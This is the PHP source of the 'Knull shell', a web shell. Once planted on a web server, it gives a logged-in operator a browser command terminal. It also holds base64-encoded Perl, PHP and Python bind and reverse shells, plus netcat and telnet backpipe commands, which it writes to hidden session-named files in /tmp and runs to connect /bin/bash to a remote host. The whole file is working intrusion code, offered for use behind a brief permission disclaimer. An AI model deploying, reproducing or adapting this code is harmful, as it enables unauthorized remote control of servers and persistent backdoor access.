<?php
/*

Knull shell alpha1

Authored by Knull of http://leethack.info

Project homepage: https://code.google.com/p/knull-shell/

Features:

Contains PHP web frontend
Contains newer bind/reverse/backpipe shells in PHP/Python/Perl, Telnet/Netcat backpipes

Disclaimer: any use of this software on a computing device can only be used with explicit permission 
from the computers rightful owner, I cannot be held responsible for the consequences of your actions.

*/

error_reporting(0);

// check for disabled PHP functions

$disabled_funcs=@ini_get('disable_functions');
if(!empty($disabled_funcs)){ $disabled_funcs=preg_replace('/[, ]+/', ',', $disabled_funcs);
$disabled_funcs=explode(',', $disabled_funcs);
$disabled_funcs=array_map('trim', $disabled_funcs); }else{ $disabled_funcs=array(); }

function logout() {

    $_SESSION = array('authenticated' => false);

    if (isset($_COOKIE[session_name()]))
        setcookie(session_name(), '', time()-44000, '/');

    session_destroy();
}


function stripslashes_deep($value) {
    if (is_array($value))
        return array_map('stripslashes_deep', $value);
    else
        return stripslashes($value);
}

// create 'hidden session looking' filename 
function sess_fname() { 
	return '.sess_'.md5(mt_rand());
}

// check for valid port
function is_port($port){
	$retport = (is_numeric($port) && $port>=0 && $port<=65535) ? true : false;
	return $retport;
}

// todo: check for valid ip

// execute command by enabled function

function exec_method($cmd) {
	
	$retval = true;

	if(is_callable('shell_exec') and !in_array('shell_exec',$disabled_funcs)) { 
		$ret_exec=shell_exec($cmd); 
	} else if (is_callable('passthru') and !in_array('passthru',$disabled_funcs)) { 
		ob_start(); passthru($cmd); $ret_exec=ob_get_contents(); ob_end_clean();
	} else if (is_callable('exec') and !in_array('exec',$disabled_funcs)) { 
		$ret_exec=array(); exec($cmd,$ret_exec); 
	} else if (is_callable('system') and !in_array('system',$disabled_funcs)) { 
		ob_start(); system($cmd); $ret_exec=ob_get_contents(); ob_end_clean(); 
	} else if (is_callable('proc_open')and!in_array('proc_open',$disabled_funcs)) { 
		$handle=proc_open($cmd,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); $ret_exec=NULL; while(!feof($pipes[1])) { $ret_exec.=fread($pipes[1],1024); } @proc_close($handle); 
	} else if(is_callable('popen')and!in_array('popen',$disabled_funcs)){ 
		$fp=popen($cmd,'r'); $ret_exec=NULL; 
	} else {
		$retval = false;
	}

	return $retval;

}

if (get_magic_quotes_gpc())
    $_POST = stripslashes_deep($_POST);

// Initialize variables 
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

$webshcmd = isset($_POST['cmd']) ? $_POST['cmd']  : '';
$rows = isset($_POST['rows']) ? $_POST['rows'] : 24;
$columns = isset($_POST['columns']) ? $_POST['columns'] : 80;

/* 
Default username:password is root:toor , replace '435b41068e8665513a20070c033b08b9c66e4332' 
in the line below with the sha1 hash from the command 'echo -n yourpasswordhere | sha1sum -' 
*/
$ini['users'] = array('root' => 'sha1:435b41068e8665513a20070c033b08b9c66e4332');

// Default settings
$default_settings = array('home-directory'   => '.');

// Merge settings
$ini['settings'] = array_merge($default_settings, $ini['users']);

session_start();

if (isset($_POST['logout']))
    logout();

// Authentication
if (isset($ini['users'][$username])) {
    if (strchr($ini['users'][$username], ':') === false) {
        // No seperator = clear text password
        $_SESSION['authenticated'] = ($ini['users'][$username] == $password);
    } else {
        list($fkt, $hash) = explode(':', $ini['users'][$username]);
        $_SESSION['authenticated'] = ($fkt($password) == $hash);
    }
}


// not authed?
if (!isset($_SESSION['authenticated']))
    $_SESSION['authenticated'] = false;

if ($_SESSION['authenticated']) {  
// Initialise session variables
    if (empty($_SESSION['cwd'])) {
        $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
        $_SESSION['output'] = '';
    }
  
    if (!empty($webshcmd)) {
  
        // append commmand to output
        $_SESSION['output'] .= '$ ' . $webshcmd . "\n";

        // Initialize cwd
        if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $webshcmd)) {
            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
        } elseif (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $webshcmd, $regs)) {
            // 'cd' command to be handled as internal shell command

            if ($regs[1]{0} == '/') {
                // its an absolute path, leave it
                $new_dir = $regs[1];
            } else {
                // append relative paths to cwd
                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
            }
      
            // '/./' becomes '/'
            while (strpos($new_dir, '/./') !== false)
                $new_dir = str_replace('/./', '/', $new_dir);

            // '//' becomes '/'
            while (strpos($new_dir, '//') !== false)
                $new_dir = str_replace('//', '/', $new_dir);

            // 'x/..' becomes ''
            while (preg_match('|/\.\.(?!\.)|', $new_dir))
                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
            if ($new_dir == '') $new_dir = '/';
      
            if (@chdir($new_dir)) {
                $_SESSION['cwd'] = $new_dir;
            } else {
                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
            }
      
        } elseif (trim($command) == 'exit') {
            logout();
        } else {

            chdir($_SESSION['cwd']);

            // cannot use putenv() when in safe mode
            if (!ini_get('safe_mode')) {
                // putenv the terminal size for programs
                putenv('ROWS=' . $rows);
                putenv('COLUMNS=' . $columns);
            }

            // alias expansion
            $length = strcspn($webshcmd, " \t");
            $token = substr($webshcmd, 0, $length);
            if (isset($ini['aliases'][$token]))
                $webshcmd = $ini['aliases'][$token] . substr($webshcmd, $length);
    
            $io = array();
            $p = proc_open($webshcmd,
                           array(1 => array('pipe', 'w'),
                                 2 => array('pipe', 'w')),
                           $io);

            // stdout
            while (!feof($io[1])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            // stderr
            while (!feof($io[2])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            
            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }


    }

       	 echo "<fieldset><legend><h4>Shells</h4></legend><form action='" . $_SERVER['REQUEST_URI'] . "' method='post'>";
       	 echo "IP: <input type='text' name='ip' size=15 maxlength=65> Port: <input type='text' name='port' size=5 maxlength=5>
<select name='bd_host'>
  <option value='default'>Select Shell...</option>
  <option value='plbd'>Bind/Perl</option>
  <option value='phpbd'>Bind/PHP</option>
  <option value='ncbp'>Reverse/NetcatBackpipe</option>
  <option value='tnbp'>Reverse/TelnetBackpipe</option>
  <option value='phprev'>Reverse/PHP</option>
  <option value='pyrev'>Reverse/Python</option>
</select>
       	 <input type='submit' value='Exec'>";
	// add ip/host validation
	if (empty($_POST['bd_host']) || $_POST['bd_host'] === 'default') { ; }
	else if (!is_port($_POST['port'])) {
		echo '<p class="error">Invalid port number!</p>';
	} else {

	$uniqfn = '/tmp/' . sess_fname();

	if ($_POST['bd_host'] === 'plbd'){

$bind_pl = "IyEvdXNyL2Jpbi9lbnYgcGVybA0KJFNIRUxMPSIvYmluL2Jhc2ggLWkiOw0KaWYgKEBBUkdWIDwg
MSkgeyBleGl0KDEpOyB9DQokTElTVEVOX1BPUlQ9JEFSR1ZbMF07DQp1c2UgU29ja2V0Ow0KJHBy
b3RvY29sPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTLCZQRl9JTkVULCZTT0NLX1NU
UkVBTSwkcHJvdG9jb2wpIHx8IGRpZSAiZXJyb3I6IHNvY2tldFxuIjsNCnNldHNvY2tvcHQoUyxT
T0xfU09DS0VULFNPX1JFVVNFQUREUiwxKTsNCmJpbmQoUyxzb2NrYWRkcl9pbigkTElTVEVOX1BP
UlQsSU5BRERSX0FOWSkpIHx8IGRpZSAiZXJyb3I6IGJpbmRcbiI7DQpsaXN0ZW4oUywzKSB8fCBk
aWUgImVycm9yOiBsaXN0ZW5cbiI7DQp3aGlsZSgxKQ0Kew0KYWNjZXB0KENPTk4sUyk7DQppZigh
KCRwaWQ9Zm9yaykpDQp7DQpkaWUgImVycm9yOiBmb3JrIiBpZiAoIWRlZmluZWQgJHBpZCk7DQpv
cGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwi
PiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJlcnJvcjogZXhlYyAkU0hF
TExcbiI7DQpjbG9zZSBDT05OOw0KZXhpdCAwOw0KfQ0KfQ0K";

	       	 @$fh=fopen($uniqfn,"ab+");
	       	 @fwrite($fh,base64_decode($bind_pl));
	       	 @fclose($fh);
	       	 $command = 'perl ' . $uniqfn . ' ' . $_POST['port'] . ' > /dev/null &';
		if (exec_method($command)) {
       			echo '<p>Perl Bindshell (should be) listening on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
			echo '<p class="error">Unable to execute Perl Bindshell!</p>';
		}

	} else if (!empty($_POST['bd_host']) && ($_POST['bd_host'] === 'phpbd')){

		$php_bind = "IyEvdXNyL2Jpbi9waHAKPD9waHAJCi8qIApLbnVsbCdzIG1vZGlmaWVkIGBtc2ZwYXlsb2FkIHBo
cC9iaW5kX3BocCBSYAoqLwoKaWYgKCRhcmdjID09PSAzKSB7CgpAc2V0X3RpbWVfbGltaXQoMCk7
CkBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgCkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDAp
OwoJCiRkZj1AaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsKaWYoIWVtcHR5KCRkZikpewoJ
JGRmPXByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJGRmKTsKCSRkZj1leHBsb2RlKCcsJywg
JGRmKTsKCSRkZj1hcnJheV9tYXAoJ3RyaW0nLCAkZGYpOwp9ZWxzZXsKCSRkZj1hcnJheSgpOwp9
CgokcG9ydD0kYXJndlsyXTsKJGlwPSRhcmd2WzFdOwoKJHNvY2s9QHNvY2tldF9jcmVhdGUoQUZf
SU5FVCxTT0NLX1NUUkVBTSxTT0xfVENQKTsKJHJldD1Ac29ja2V0X2JpbmQoJHNvY2ssJGlwLCRw
b3J0KTsKJHJldD1Ac29ja2V0X2xpc3Rlbigkc29jayw1KTsKCiRtc2dzb2NrPUBzb2NrZXRfYWNj
ZXB0KCRzb2NrKTsKQHNvY2tldF9jbG9zZSgkc29jayk7Cgp3aGlsZShGQUxTRSE9PUBzb2NrZXRf
c2VsZWN0KCRyPWFycmF5KCRtc2dzb2NrKSwgJHc9TlVMTCwgJGU9TlVMTCwgTlVMTCkpCnsKCSRv
ID0gJyc7CgkkYz1Ac29ja2V0X3JlYWQoJG1zZ3NvY2ssMjA0OCxQSFBfTk9STUFMX1JFQUQpOwoJ
aWYoRkFMU0U9PT0kYyl7YnJlYWs7fQoJaWYoc3Vic3RyKCRjLDAsMykgPT0gJ2NkICcpewoJCWNo
ZGlyKHN1YnN0cigkYywzLC0xKSk7Cgl9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0
JyB8fCBzdWJzdHIoJGMsMCw0KSA9PSAnZXhpdCcpIHsKCQlicmVhazsKCX1lbHNlewoJCWlmIChG
QUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicgKSkgewoJCSRjPSRjLiIg
Mj4mMVxuIjsKCX0KCSRpc2M9J2lzX2NhbGxhYmxlJzsKCSRpbmE9J2luX2FycmF5JzsKCQkKCWlm
KCRpc2MoJ3N5c3RlbScpYW5kISRpbmEoJ3N5c3RlbScsJGRmKSl7CgkJb2Jfc3RhcnQoKTsKCQlz
eXN0ZW0oJGMpOwoJCSRvPW9iX2dldF9jb250ZW50cygpOwoJCW9iX2VuZF9jbGVhbigpOwoJfWVs
c2UgaWYoJGlzYygncGFzc3RocnUnKWFuZCEkaW5hKCdwYXNzdGhydScsJGRmKSl7CgkJb2Jfc3Rh
cnQoKTsKCQlwYXNzdGhydSgkYyk7CgkJJG89b2JfZ2V0X2NvbnRlbnRzKCk7CgkJb2JfZW5kX2Ns
ZWFuKCk7Cgl9ZWxzZSBpZigkaXNjKCdleGVjJylhbmQhJGluYSgnZXhlYycsJGRmKSl7CgkJJG89
YXJyYXkoKTsKCQlleGVjKCRjLCRvKTsKCQkkbz1qb2luKGNocigxMCksJG8pLmNocigxMCk7Cgl9
ZWxzZSBpZigkaXNjKCdwcm9jX29wZW4nKWFuZCEkaW5hKCdwcm9jX29wZW4nLCRkZikpewoJCSRo
YW5kbGU9cHJvY19vcGVuKCRjLGFycmF5KGFycmF5KHBpcGUsJ3InKSxhcnJheShwaXBlLCd3Jyks
YXJyYXkocGlwZSwndycpKSwkcGlwZXMpOwoJCSRvPU5VTEw7CgkJd2hpbGUoIWZlb2YoJHBpcGVz
WzFdKSl7CgkJCSRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CgkJfQoJCUBwcm9jX2Nsb3NlKCRo
YW5kbGUpOwoJfWVsc2UgaWYoJGlzYygncG9wZW4nKWFuZCEkaW5hKCdwb3BlbicsJGRmKSl7CgkJ
JGZwPXBvcGVuKCRjLCdyJyk7CgkJJG89TlVMTDsKCQlpZihpc19yZXNvdXJjZSgkZnApKXsKCQkJ
d2hpbGUoIWZlb2YoJGZwKSl7CgkJCQkkby49ZnJlYWQoJGZwLDEwMjQpOwoJCQl9CgkJfQoJCUBw
Y2xvc2UoJGZwKTsKCX1lbHNlIGlmKCRpc2MoJ3NoZWxsX2V4ZWMnKWFuZCEkaW5hKCdzaGVsbF9l
eGVjJywkZGYpKXsKCQkkbz1zaGVsbF9leGVjKCRjKTsKCX1lbHNlIHsKCQkkbz0wOwoJfQoJCQoJ
fQoJQHNvY2tldF93cml0ZSgkbXNnc29jaywkbyxzdHJsZW4oJG8pKTsKfQpAc29ja2V0X2Nsb3Nl
KCRtc2dzb2NrKTsKfSBlbHNlIHsKCWVjaG8gJ3VzYWdlOiAnIC4gJGFyZ3ZbMF0gLiAnIHBvcnQn
IC4gIlxuIjsKfQoKPz4K";


	         @$fh=fopen($uniqfn,"wb+");
        	 @fwrite($fh,base64_decode($php_bind));
      		 @fclose($fh);
		$command = 'php ' . $uniqfn . ' ' . $_POST['ip'] . ' ' . $_POST['port'] . ' > /dev/null &';
		if (exec_method($command)) {
		        echo '<p>PHP Bindshell (should be) listening on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
	        	echo '<p class="error">Unable to execute PHP Bindshell</p>';
		}

		
	} else if (!empty($_POST['bd_host']) && ($_POST['bd_host'] === 'phprev')){

$php_rev = 'IyEvdXNyL2Jpbi9waHAKPD9waHAKLyogCktudWxsJ3MgbW9kaWZpZWQgYG1zZnBheWxvYWQgcGhw
L3JldmVyc2VfcGhwIExIT1NUPVguWC5YLlggUmBgCiovCgppZiAoJGFyZ2MgPT09IDMpIHsKCgkk
aXBhZGRyPSRhcmd2WzFdOwoJJHBvcnQ9JGFyZ3ZbMl07CgkJCglAc2V0X3RpbWVfbGltaXQoMCk7
IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7
CgkkZGY9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CglpZighZW1wdHkoJGRmKSl7CgkJ
JGRmPXByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJGRpcyk7CgkJJGRmPWV4cGxvZGUoJywn
LCAkZGlzKTsKCQkkZGY9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7Cgl9ZWxzZXsKCQkkZGY9YXJy
YXkoKTsKCX0KCQkJCgoJaWYoIWZ1bmN0aW9uX2V4aXN0cygnY2V4ZScpKXsKCQlmdW5jdGlvbiBj
ZXhlKCRjKXsKCQkJZ2xvYmFsICRkZjsKCQkJCgkJaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9s
b3dlcihQSFBfT1MpLCAnd2luJyApKSB7CgkJCSRjPSRjLiIgMj4mMVxuIjsKCQl9CgkJJGlzYz0n
aXNfY2FsbGFibGUnOwoJCSRpc2E9J2luX2FycmF5JzsKCQkKCQlpZigkaXNjKCdzeXN0ZW0nKWFu
ZCEkaXNhKCdzeXN0ZW0nLCRkZikpewoJCQlvYl9zdGFydCgpOwoJCQlzeXN0ZW0oJGMpOwoJCQkk
bz1vYl9nZXRfY29udGVudHMoKTsKCQkJb2JfZW5kX2NsZWFuKCk7CgkJfWVsc2UKCQlpZigkaXNj
KCdwb3BlbicpYW5kISRpc2EoJ3BvcGVuJywkZGYpKXsKCQkJJGZwPXBvcGVuKCRjLCdyJyk7CgkJ
CSRvPU5VTEw7CgkJCWlmKGlzX3Jlc291cmNlKCRmcCkpewoJCQkJd2hpbGUoIWZlb2YoJGZwKSl7
CgkJCQkJJG8uPWZyZWFkKCRmcCwxMDI0KTsKCQkJCX0KCQkJfQoJCQlAcGNsb3NlKCRmcCk7CgkJ
fWVsc2UKCQlpZigkaXNjKCdwcm9jX29wZW4nKWFuZCEkaXNhKCdwcm9jX29wZW4nLCRkZikpewoJ
CQkkaGFuZGxlPXByb2Nfb3BlbigkYyxhcnJheShhcnJheShwaXBlLCdyJyksYXJyYXkocGlwZSwn
dycpLGFycmF5KHBpcGUsJ3cnKSksJHBpcGVzKTsKCQkJJG89TlVMTDsKCQkJd2hpbGUoIWZlb2Yo
JHBpcGVzWzFdKSl7CgkJCQkkby49ZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwoJCQl9CgkJCUBwcm9j
X2Nsb3NlKCRoYW5kbGUpOwoJCX1lbHNlCgkJaWYoJGlzYygnZXhlYycpYW5kISRpc2EoJ2V4ZWMn
LCRkZikpewoJCQkkbz1hcnJheSgpOwoJCQlleGVjKCRjLCRvKTsKCQkJJG89am9pbihjaHIoMTAp
LCRvKS5jaHIoMTApOwoJCX1lbHNlCgkJaWYoJGlzYygncGFzc3RocnUnKWFuZCEkaXNhKCdwYXNz
dGhydScsJGRmKSl7CgkJCW9iX3N0YXJ0KCk7CgkJCXBhc3N0aHJ1KCRjKTsKCQkJJG89b2JfZ2V0
X2NvbnRlbnRzKCk7CgkJCW9iX2VuZF9jbGVhbigpOwoJCX1lbHNlCgkJaWYoJGlzYygnc2hlbGxf
ZXhlYycpYW5kISRpc2EoJ3NoZWxsX2V4ZWMnLCRkZikpewoJCQkkbz1zaGVsbF9leGVjKCRjKTsK
CQl9ZWxzZQoJCXsKCQkJJG89MDsKCQl9CgkKCQkJcmV0dXJuICRvOwoJCX0KCX0KCSRub2Z1bmNz
PSdubyBleGVjIGZ1bmN0aW9ucyc7CglpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5f
YXJyYXkoJ2Zzb2Nrb3BlbicsJGRmKSl7CgkJJHM9QGZzb2Nrb3BlbigkaXBhZGRyLCRwb3J0KTsK
CQl3aGlsZSgkYz1mcmVhZCgkcywyMDQ4KSl7CgkJCSRvdXQgPSAnJzsKCQkJaWYoc3Vic3RyKCRj
LDAsMykgPT0gJ2NkICcpewoJCQkJY2hkaXIoc3Vic3RyKCRjLDMsLTEpKTsKCQkJfSBlbHNlIGlm
IChzdWJzdHIoJGMsMCw0KSA9PSAncXVpdCcgfHwgc3Vic3RyKCRjLDAsNCkgPT0gJ2V4aXQnKSB7
CgkJCQlicmVhazsKCQkJfWVsc2V7CgkJCQkkb3V0PWNleGUoc3Vic3RyKCRjLDAsLTEpKTsKCQkJ
CWlmKCRvdXQ9PT1mYWxzZSl7CgkJCQkJZndyaXRlKCRzLCRub2Z1bmNzKTsKCQkJCQlicmVhazsK
CQkJCX0KCQkJfQoJCQlmd3JpdGUoJHMsJG91dCk7CgkJfQoJCWZjbG9zZSgkcyk7Cgl9ZWxzZXsK
CQkkcz1Ac29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApOwoJCUBzb2Nr
ZXRfY29ubmVjdCgkcywkaXBhZGRyLCRwb3J0KTsKCQlAc29ja2V0X3dyaXRlKCRzLCJzb2NrZXRf
Y3JlYXRlIik7CgkJd2hpbGUoJGM9QHNvY2tldF9yZWFkKCRzLDIwNDgpKXsKCQkJJG91dCA9ICcn
OwoJCQlpZihzdWJzdHIoJGMsMCwzKSA9PSAnY2QgJyl7CgkJCQljaGRpcihzdWJzdHIoJGMsMywt
MSkpOwoJCQl9IGVsc2UgaWYgKHN1YnN0cigkYywwLDQpID09ICdxdWl0JyB8fCBzdWJzdHIoJGMs
MCw0KSA9PSAnZXhpdCcpIHsKCQkJCWJyZWFrOwoJCQl9ZWxzZXsKCQkJCSRvdXQ9Y2V4ZShzdWJz
dHIoJGMsMCwtMSkpOwoJCQkJaWYoJG91dD09PWZhbHNlKXsKCQkJCQlAc29ja2V0X3dyaXRlKCRz
LCRub2Z1bmNzKTsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCQlAc29ja2V0X3dyaXRlKCRzLCRv
dXQsc3RybGVuKCRvdXQpKTsKCQl9CgkJQHNvY2tldF9jbG9zZSgkcyk7Cgl9Cn0gZWxzZSB7CiAg
ICAgICAgZWNobyAndXNhZ2U6ICcgLiAkYXJndlswXSAuICcgcG9ydCcgLiAiXG4iOwp9Cgo/Pgo=
';

		 @$fh=fopen($uniqfn,"wb+");
        	 @fwrite($fh,base64_decode($php_rev));
      		 @fclose($fh);
		$command = 'php ' . $uniqfn . ' ' . $_POST['ip'] . ' ' . $_POST['port'] . ' > /dev/null &';
		if (exec_method($command)) {
               		echo '<p>Check your nc listener on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
 		       echo '<p class="error">Unable to execute PHP reverse shell</p>';
		}

	} else if (!empty($_POST['bd_host']) && ($_POST['bd_host'] === 'pyrev')){

$py_rev = 'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHN5cwoKcz1zb2NrZXQuc29ja2V0KHNvY2tldC5B
Rl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KChzeXMuYXJndlsxXSxpbnQoc3lz
LmFyZ3ZbMl0pKSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpv
cy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7
Cg==';

		 @$fh=fopen($uniqfn,"wb+");
        	 @fwrite($fh,base64_decode($py_rev));
      		 @fclose($fh);
		$command = 'python ' . $uniqfn . ' ' . $_POST['ip'] . ' ' . $_POST['port'] . ' > /dev/null &';
		if (exec_method($command)) {
               		echo '<p>Check your nc listener on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
 		       echo '<p class="error">Unable to execute Python reverse shell</p>';
		}

	} else if (!empty($_POST['bd_host']) && ($_POST['bd_host'] === 'ncbp')){

		$bpname = '/tmp/' . sess_fname();
		$cmdfile = 'mknod ' . $bpname . ' p && nc ' . $_POST['ip'] . ' ' . $_POST['port'] . ' 0<' . $bpname . ' | /bin/bash 1>' . $bpname . ' &';
	         @$fh=fopen($uniqfn,"wb+");
        	 @fwrite($fh,$cmdfile);
      		 @fclose($fh);
		$command = '/bin/bash ' . $uniqfn . ' > /dev/null &';
		if (exec_method($command)) {
		        echo '<p>Check your Netcat listener on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
		       echo '<p class="error">Unable to execute Netcat Backpipe</p>';
		}

	
	} else if (isset($_POST['bd_host']) && ($_POST['bd_host'] === 'tnbp')){

		$bpname = '/tmp/' . sess_fname();
		$cmdfile = 'mknod ' . $bpname . ' p && telnet ' . $_POST['ip'] . ' ' . $_POST['port'] . ' 0<' . $bpname . ' | /bin/bash 1>' . $bpname;
	         @$fh=fopen($uniqfn,"wb+");
        	 @fwrite($fh,$cmdfile);
      		 @fclose($fh);
		$command = '/bin/bash ' . $uniqfn . ' > /dev/null &';
		if (exec_method($command)) {
		        echo '<p>Check your Netcat listener on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';
		} else {
		       echo '<p class="error">Unable to execute Telnet Backpipe</p>';
		}


	}
	}	
echo '</fieldset>';


}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <title>Knull Shell</title>
<style type="text/css">

body {
  font-family: sans-serif;
  color: black;
  background: #f3f3f3;
}

h4 {
  color: navy;
}

img {
  border: none;
}

div#terminal {
  border: inset 2px navy;
  padding: 2px;
  margin-top: 0.5em;
}

div#terminal textarea { 
  color: white;
  background: black;
  font-size: 100%;
  width: 100%;
  border: none;
}

p {
  margin-top: 0.5em;
  margin-bottom: 0.5em;
}

p#prompt {
  color: white;
  background: black;
  font-family: monospace;
  margin: 0px;
}

p#prompt input {
  color: white;
  background: black;
  border: none;
  font-family: monospace;
}

legend {
  padding-right: 0.5em;
}

fieldset {
  padding: 0.5em;
}

div#navycolor {

  color: navy;

}

.error {
  color: red;
}

</style>
</head>

<body>

<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">

<?php
if (!$_SESSION['authenticated']) {
?>

<fieldset>
  <legend><h4>Authentication</h4></legend>

  <?php
  if (!empty($username))
      echo '  <p class="error">Login failed, please try again:</p>' . "\n";
  ?>

  <p>Username: <input name="username" type="text" value="<?php echo $username
  ?>"></p>

  <p>Password: <input name="password" type="password"></p>

  <p><input type="submit" value="Login"></p>

</fieldset>

<?php } else { /* Auth'd */ ?>

<fieldset>
  <legend><h4>Server Details</h4></legend>
ServerIP: <?php echo $_SERVER['SERVER_ADDR']; ?> &nbsp;&nbsp; VHost: <?php echo htmlspecialchars($_SERVER['SERVER_NAME']); ?> &nbsp;&nbsp; YourIP: <?php if (empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { echo htmlspecialchars($_SERVER['REMOTE_ADDR']); } else { echo htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']); } ?> &nbsp;&nbsp; Software: <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?><br />UserAgent: <?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?><br />
Pwd: <?php echo htmlspecialchars($_SESSION['cwd'], ENT_COMPAT, 'UTF-8'); ?> <br />
ServerSig: <?php echo htmlspecialchars($_SERVER['SERVER_SIGNATURE'])?>
<div id="terminal">
<textarea name="output" readonly="readonly" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $rows+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p id="prompt">
  $&nbsp;<input name="cmd" type="text"
                onkeyup="key(event)" size="<?php echo $columns-2 ?>" tabindex="1">
</p>
</div>

<p>
  <span style="float: right">Size: <input type="text" name="rows" size="2"
  maxlength="3" value="<?php echo $rows ?>"> &times; <input type="text"
  name="columns" size="2" maxlength="3" value="<?php echo $columns
  ?>"></span>
  
<input type="submit" value="Exec">
  <input type="submit" name="logout" value="Logout">
</p>

</fieldset>

<?php } ?>

</form>

</body>
</html>
